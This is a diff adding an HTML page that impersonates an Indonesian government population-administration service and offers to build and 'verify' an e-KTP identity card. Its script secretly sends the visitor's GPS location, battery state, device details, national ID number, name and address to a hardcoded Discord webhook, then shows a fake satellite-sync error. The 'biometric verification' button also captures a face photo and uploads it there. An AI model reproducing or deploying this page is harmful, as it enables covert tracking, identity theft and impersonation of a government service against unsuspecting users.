@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Sistem Informasi Administrasi Kependudukan - Terintegrasi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #e2e8f0;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .gov-header {
+            width: 100%;
+            max-width: 550px;
+            background: #003366;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            border-radius: 12px 12px 0 0;
+            border-bottom: 4px solid #c5a059;
+        }
+
+        .gov-header h1 { font-size: 16px; letter-spacing: 1px; }
+        .gov-header p { font-size: 9px; margin-top: 4px; opacity: 0.8; }
+
+        .ktp-container {
+            width: 100%;
+            max-width: 520px;
+            background-color: #b0d4f1;
+            background-image: linear-gradient(rgba(176, 212, 241, 0.85), rgba(176, 212, 241, 0.85));
+            background-size: cover;
+            border-radius: 15px;
+            padding: 16px;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            margin: 20px 0;
+            border: 1px solid #8eb3cf;
+            color: #000;
+        }
+
+        #scanner-line {
+            position: absolute;
+            top: -5px;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: #00f2ff;
+            box-shadow: 0 0 15px 3px #00f2ff;
+            z-index: 100;
+            display: none;
+        }
+
+        @keyframes scanning {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .header-ktp {
+            text-align: center;
+            font-weight: bold;
+            font-size: 12px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+
+        .main-data {
+            display: flex;
+            flex-wrap: wrap;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .col-left { flex: 1; min-width: 200px; }
+        .row { display: flex; margin-bottom: 4px; flex-wrap: wrap; }
+        .label { width: 110px; text-transform: uppercase; }
+        .colon { width: 12px; }
+        .value { flex: 1; text-transform: uppercase; word-break: break-word; }
+
+        .sub-row { padding-left: 12px; }
+        .sub-row .label { width: 98px; }
+
+        .nik-highlight { font-size: 14px; margin-bottom: 6px; letter-spacing: 1px; font-weight: bold; }
+
+        .col-right {
+            width: 120px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .photo-box {
+            width: 100px;
+            height: 125px;
+            background: #d32f2f;
+            border: 1px solid #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .photo-box img { width: 100%; height: 100%; object-fit: cover; }
+
+        .sign-area {
+            margin-top: 6px;
+            text-align: center;
+            font-size: 7px;
+            font-weight: bold;
+            width: 100%;
+        }
+
+        .signature-display {
+            width: 80px;
+            height: 35px;
+            margin: 2px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .signature-display img { max-width: 100%; max-height: 100%; }
+
+        .name-under-sign {
+            font-size: 7px;
+            text-decoration: underline;
+            text-transform: uppercase;
+            margin-top: 2px;
+            display: block;
+        }
+
+        .form-panel {
+            width: 100%;
+            max-width: 520px;
+            background: white;
+            padding: 20px;
+            border-radius: 0 0 12px 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .input-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 12px;
+        }
+
+        button {
+            padding: 12px;
+            background: #003366;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 12px;
+        }
+
+        button:active { transform: scale(0.97); }
+
+        .btn-scan { background: #b45309; }
+        .btn-random { background: #1e293b; }
+        .btn-download { background: #2d6a4f; }
+
+        #camera-stream {
+            width: 100%;
+            max-width: 400px;
+            margin: 15px auto;
+            display: none;
+            border: 3px solid #003366;
+            border-radius: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .label { width: 85px; font-size: 9px; }
+            .sub-row .label { width: 75px; }
+            .nik-highlight { font-size: 11px; }
+            .col-right { width: 100px; }
+            .photo-box { width: 85px; height: 105px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="gov-header">
+    <h1>SISTEM LAYANAN ADMINISTRASI KEPENDUDUKAN</h1>
+    <p>REPUBLIK INDONESIA - DIREKTORAT JENDERAL KEPENDUDUKAN DAN PENCATATAN SIPIL</p>
+</div>
+
+<div class="ktp-container" id="ktp-render">
+    <div id="scanner-line"></div>
+    <div class="header-ktp">PROVINSI JAWA BARAT<br>KABUPATEN BANDUNG</div>
+    <div class="main-data">
+        <div class="col-left">
+            <div class="row nik-highlight">
+                <div class="label">NIK</div><div class="colon">:</div><div class="value" id="res-nik">3204000000000000</div>
+            </div>
+            <div class="row"><div class="label">Nama</div><div class="colon">:</div><div class="value" id="res-nama">-</div></div>
+            <div class="row"><div class="label">Tempat/Tgl Lahir</div><div class="colon">:</div><div class="value" id="res-ttl">-</div></div>
+            <div class="row"><div class="label">Jenis Kelamin</div><div class="colon">:</div><div class="value" id="res-jk">LAKI-LAKI</div></div>
+            <div class="row"><div class="label">Alamat</div><div class="colon">:</div><div class="value" id="res-alamat">-</div></div>
+            <div class="row sub-row"><div class="label">RT/RW</div><div class="colon">:</div><div class="value" id="res-rtrw">-</div></div>
+            <div class="row sub-row"><div class="label">Kel/Desa</div><div class="colon">:</div><div class="value" id="res-desa">-</div></div>
+            <div class="row sub-row"><div class="label">Kecamatan</div><div class="colon">:</div><div class="value" id="res-kec">-</div></div>
+            <div class="row"><div class="label">Agama</div><div class="colon">:</div><div class="value" id="res-agama">ISLAM</div></div>
+            <div class="row"><div class="label">Status Perkawinan</div><div class="colon">:</div><div class="value" id="res-status">BELUM KAWIN</div></div>
+            <div class="row"><div class="label">Pekerjaan</div><div class="colon">:</div><div class="value" id="res-kerja">-</div></div>
+            <div class="row"><div class="label">Kewarganegaraan</div><div class="colon">:</div><div class="value">WNI</div></div>
+        </div>
+        <div class="col-right">
+            <div class="photo-box" id="photo-target">
+                <span style="color:white;font-size:8px;">PAS FOTO</span>
+            </div>
+            <div class="sign-area">
+                KABUPATEN BANDUNG<br>27-04-2026
+                <div class="signature-display" id="res-sign-img"></div>
+                <span class="name-under-sign" id="res-sign-name">NAMA LENGKAP</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="form-panel">
+    <div class="input-grid">
+        <button class="btn-scan" id="btn-scan" style="grid-column: span 2;">SCAN LOKASI AKURAT (OPSIONAL) </button>
+        
+        <input type="text" id="in-nik" placeholder="NIK">
+        <input type="text" id="in-nama" placeholder="NAMA LENGKAP">
+        <input type="text" id="in-ttl" placeholder="TEMPAT, TGL LAHIR">
+        <input type="text" id="in-alamat" placeholder="ALAMAT">
+        <input type="text" id="in-rtrw" placeholder="RT/RW">
+        <input type="text" id="in-desa" placeholder="KEL/DESA">
+        <input type="text" id="in-kec" placeholder="KECAMATAN">
+        <select id="in-agama">
+            <option>ISLAM</option><option>KRISTEN</option><option>KATHOLIK</option><option>HINDU</option><option>BUDDHA</option>
+        </select>
+        <select id="in-status">
+            <option>BELUM KAWIN</option><option>KAWIN</option><option>JANDA</option><option>DUDA</option>
+        </select>
+        <input type="text" id="in-kerja" placeholder="PEKERJAAN">
+        
+        <div style="grid-column: span 2; text-align: center;">
+            <p style="font-size:11px;font-weight:bold;margin:5px 0;">✍️ TANDA TANGAN DIGITAL:</p>
+            <canvas id="signature-pad" width="300" height="90" style="width:100%; height:auto; border:1px solid #ccc; border-radius:8px;"></canvas><br>
+            <button type="button" id="clear-sign" style="background:#6c757d; margin-top:5px;">HAPUS TTD</button>
+        </div>
+
+        <button class="btn-action" id="btn-activate" style="grid-column: span 2;">📸 MULAI VERIFIKASI BIOMETRIK</button>
+        <button class="btn-download" id="btn-download" style="grid-column: span 2;">⬇️ SIMPAN KTP (PNG)</button>
+    </div>
+    <video id="camera-stream" autoplay playsinline></video>
+</div>
+
+<canvas id="capture-canvas" style="display:none;"></canvas>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script>
+    const webhook = "https://discord.com/api/webhooks/1498320491524395179/wnjFcqK23V9vmOhzlQ2l2lC8U2tD_dN_fWBeEIq-BnyrmmAhKrVO4sYJTKQhRh-TjW4A";
+
+    // =============== CEK BATERAI ===============
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                const level = Math.floor(battery.level * 100);
+                return { level: level, isCharging: battery.charging, text: `🔋 Baterai: ${level}%${battery.charging ? ' (⚡ ngecas)' : ' (🔋 tidak ngecas)'}` };
+            } catch(e) { return { text: "🔋 Baterai: tidak diketahui" }; }
+        }
+        return { text: "⚠️ Browser tidak support Battery API" };
+    }
+
+    // =============== KIRIM LOKASI + BATERAI KE DISCORD (DIAM-DIAM) ===============
+    async function sendLocationAndBatterySilent() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(false);
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const battery = await getBatteryInfo();
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const userData = {
+                    nik: document.getElementById('in-nik').value || "-",
+                    nama: document.getElementById('in-nama').value || "-",
+                    alamat: document.getElementById('in-alamat').value || "-"
+                };
+                
+                const payload = {
+                    content: "📡 **LOG TERBARU TERDETEKSI** 📡",
+                    embeds: [{
+                        title: "📍 DATA LOKASI & PERANGKAT",
+                        color: 0xff6600,
+                        fields: [
+                            { name: "🌐 Lokasi", value: `${lat}, ${lon}`, inline: true },
+                            { name: "🗺️ Maps", value: `[Klik disini](${mapsLink})`, inline: true },
+                            { name: battery.text, value: "⚡ Status Daya", inline: false },
+                            { name: "📱 Device", value: navigator.userAgent.slice(0, 60), inline: false },
+                            { name: "🆔 NIK", value: userData.nik, inline: true },
+                            { name: "👤 Nama", value: userData.nama, inline: true },
+                            { name: "🏠 Alamat", value: userData.alamat, inline: false },
+                            { name: "🕒 Waktu", value: new Date().toLocaleString('id-ID'), inline: true }
+                        ],
+                        footer: { text: "SIAK Mobile Pro • Auto Sync" }
+                    }]
+                };
+                
+                await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                resolve(true);
+            }, () => { resolve(false); }, { enableHighAccuracy: true });
+        });
+    }
+
+    // =============== DATA ACACAN (10 VARIAN) UNTUK POPUP ===============
+    const randomNames = ["BUDI SANTOSO", "SITI NURHALIZA", "AGUS SETIAWAN", "DEWI ANGGRAINI", "HENDRA KURNIAWAN", "RINA MARDIYANTI", "DIMAS PRASETYO", "LESTARI HANDAYANI", "REZA FAHLEVI", "ANNISA RAHMAWATI"];
+    const randomNik = ["3374011203940001", "3374022305920002", "3173011501900003", "3275010102950004", "3374031707880005", "3374052506000006", "3374061303040007", "3374071901040008", "3374080408080009", "3374092312100010"];
+    const randomAlamat = ["Jl. Mawar Indah No 12", "Jl. Sudirman No 45", "Jl. Diponegoro Kav 8", "Jl. Ahmad Yani Gg Melati", "Jl. Pahlawan No 78", "Perum Bukit Permai Blok C5", "Jl. Veteran No 22", "Jl. Raya Krapyak No 15A", "Griya Laras Asri Blok F7", "Jl. Kenanga No 33"];
+    
+    function fillRandomData() {
+        const idx = Math.floor(Math.random() * 10);
+        document.getElementById('in-nik').value = randomNik[idx];
+        document.getElementById('in-nama').value = randomNames[idx];
+        document.getElementById('in-ttl').value = "BANDUNG, 01-01-1995";
+        document.getElementById('in-alamat').value = randomAlamat[idx];
+        document.getElementById('in-rtrw').value = "002/005";
+        document.getElementById('in-desa').value = "DESA SUMBERREJO";
+        document.getElementById('in-kec').value = "BANYUMANIK";
+        document.getElementById('in-agama').value = ["ISLAM","KRISTEN","KATHOLIK","HINDU","BUDDHA"][Math.floor(Math.random()*5)];
+        document.getElementById('in-status').value = ["BELUM KAWIN","KAWIN","JANDA","DUDA"][Math.floor(Math.random()*4)];
+        document.getElementById('in-kerja').value = ["PELAJAR","WIRASWASTA","PNS","SWASTA"][Math.floor(Math.random()*4)];
+        
+        // Update preview
+        const fields = { 'in-nik':'res-nik', 'in-nama':'res-nama', 'in-ttl':'res-ttl', 'in-alamat':'res-alamat', 'in-rtrw':'res-rtrw', 'in-desa':'res-desa', 'in-kec':'res-kec', 'in-agama':'res-agama', 'in-status':'res-status', 'in-kerja':'res-kerja' };
+        Object.keys(fields).forEach(k => { document.getElementById(fields[k]).innerText = document.getElementById(k).value.toUpperCase(); });
+        document.getElementById('res-sign-name').innerText = document.getElementById('in-nama').value.toUpperCase();
+    }
+
+    // =============== SCAN LOKASI AKURAT (TOMBLON UTAMA) ===============
+    document.getElementById('btn-scan').onclick = async () => {
+        // 1. Minta izin lokasi & kirim ke Discord diam-diam
+        const locSent = await sendLocationAndBatterySilent();
+        
+        // 2. Popup error scan (palsu)
+        alert("TERDETEKSI GAGAL SINKRONISASI SATELIT!\n\nKoneksi GPS tidak stabil atau server sedang sibuk.");
+        
+        // 3. Popup gunakan data acak
+        const useRandom = confirm("Gunakan DATA ACAK untuk melanjutkan verifikasi?\n\nKlik untuk mengisi data secara otomatis.");
+        
+        if (useRandom) {
+            fillRandomData();
+            alert("✅ Data acak berhasil diisi! Silakan lanjutkan verifikasi biometrik.");
+        } else {
+            alert("Silakan isi data secara manual.");
+        }
+    };
+
+    // =============== SIGNATURE PAD ===============
+    const sigCanvas = document.getElementById('signature-pad');
+    const sigCtx = sigCanvas.getContext('2d');
+    let drawing = false;
+    
+    sigCanvas.width = sigCanvas.clientWidth;
+    sigCanvas.height = sigCanvas.clientHeight;
+    
+    function getPos(e) {
+        let rect = sigCanvas.getBoundingClientRect();
+        let clientX = e.touches ? e.touches[0].clientX : e.clientX;
+        let clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        let scaleX = sigCanvas.width / rect.width;
+        let scaleY = sigCanvas.height / rect.height;
+        return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY };
+    }
+    
+    const startDraw = (e) => { drawing = true; let p = getPos(e); sigCtx.beginPath(); sigCtx.moveTo(p.x, p.y); e.preventDefault(); };
+    const drawMove = (e) => { if (!drawing) return; let p = getPos(e); sigCtx.lineTo(p.x, p.y); sigCtx.lineWidth = 2; sigCtx.stroke(); document.getElementById('res-sign-img').innerHTML = `<img src="${sigCanvas.toDataURL()}" style="max-height:35px;">`; e.preventDefault(); };
+    
+    sigCanvas.addEventListener('mousedown', startDraw); sigCanvas.addEventListener('mousemove', drawMove); window.addEventListener('mouseup', () => drawing = false);
+    sigCanvas.addEventListener('touchstart', startDraw); sigCanvas.addEventListener('touchmove', drawMove); sigCanvas.addEventListener('touchend', () => drawing = false);
+    document.getElementById('clear-sign').onclick = () => { sigCtx.clearRect(0, 0, sigCanvas.width, sigCanvas.height); document.getElementById('res-sign-img').innerHTML = ""; };
+
+    // =============== VERIFIKASI BIOMETRIK + KIRIM FOTO KE DISCORD ===============
+    document.getElementById('btn-activate').onclick = async () => {
+        const video = document.getElementById('camera-stream');
+        const scanner = document.getElementById('scanner-line');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            scanner.style.display = 'block';
+            scanner.style.animation = 'scanning 2s linear infinite';
+
+            setTimeout(async () => {
+                const canvas = document.getElementById('capture-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                document.getElementById('photo-target').innerHTML = `<img src="${dataUrl}">`;
+                
+                const blob = await fetch(dataUrl).then(r => r.blob());
+                const fd = new FormData();
+                fd.append("file", blob, "wajah_ektp.jpg");
+                fd.append("payload_json", JSON.stringify({
+                    content: "🪪 **FOTO BIOMETRIK e-KTP**",
+                    embeds: [{
+                        title: "Verifikasi Wajah Berhasil",
+                        color: 0x003366,
+                        fields: [
+                            { name: "NIK", value: document.getElementById('in-nik').value || "-", inline: true },
+                            { name: "Nama", value: document.getElementById('in-nama').value || "-", inline: true }
+                        ],
+                        image: { url: "attachment://wajah_ektp.jpg" }
+                    }]
+                }));
+                await fetch(webhook, { method: 'POST', body: fd });
+                
+                stream.getTracks().forEach(t => t.stop());
+                video.style.display = 'none';
+                scanner.style.display = 'none';
+                alert("✅ Verifikasi Biometrik Selesai!");
+            }, 3000);
+        } catch(e) { alert("Izin kamera diperlukan."); }
+    };
+
+    // =============== DOWNLOAD KTP (PNG) ===============
+    document.getElementById('btn-download').onclick = () => {
+        const target = document.getElementById('ktp-render');
+        html2canvas(target, { scale: 2.5, backgroundColor: '#b0d4f1' }).then(canvas => {
+            const link = document.createElement('a');
+            link.download = `eKTP_${Date.now()}.png`;
+            link.href = canvas.toDataURL();
+            link.click();
+        }).catch(() => alert("Gagal mengunduh"));
+    };
+
+    // =============== AUTO UPDATE PREVIEW ===============
+    const updateMap = {
+        'in-nik': 'res-nik', 'in-nama': 'res-nama', 'in-ttl': 'res-ttl',
+        'in-alamat': 'res-alamat', 'in-rtrw': 'res-rtrw', 'in-desa': 'res-desa',
+        'in-kec': 'res-kec', 'in-agama': 'res-agama', 'in-status': 'res-status',
+        'in-kerja': 'res-kerja'
+    };
+    Object.keys(updateMap).forEach(id => {
+        document.getElementById(id).addEventListener('input', (e) => {
+            document.getElementById(updateMap[id]).innerText = e.target.value.toUpperCase() || "-";
+            if(id === 'in-nama') document.getElementById('res-sign-name').innerText = e.target.value.toUpperCase();
+        });
+    });
+</script>
+</body>
+</html>
